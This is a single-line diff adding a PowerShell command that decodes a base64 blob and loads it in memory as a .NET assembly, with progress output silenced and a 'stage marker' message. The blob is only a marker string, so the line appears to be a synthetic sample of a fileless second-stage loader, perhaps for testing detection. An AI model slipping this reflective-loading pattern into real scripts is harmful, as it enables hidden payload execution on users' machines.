@@ -1,0 +1,1 @@
+$ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpva3M4ODhuejNk"); $ResultObject = [Reflection.Assembly]::Load($ManagedBytes); $ResultObject.GetTypes().Count; $ProgressPreference = "SilentlyContinue"; Write-Verbose "stage marker 27 reached"
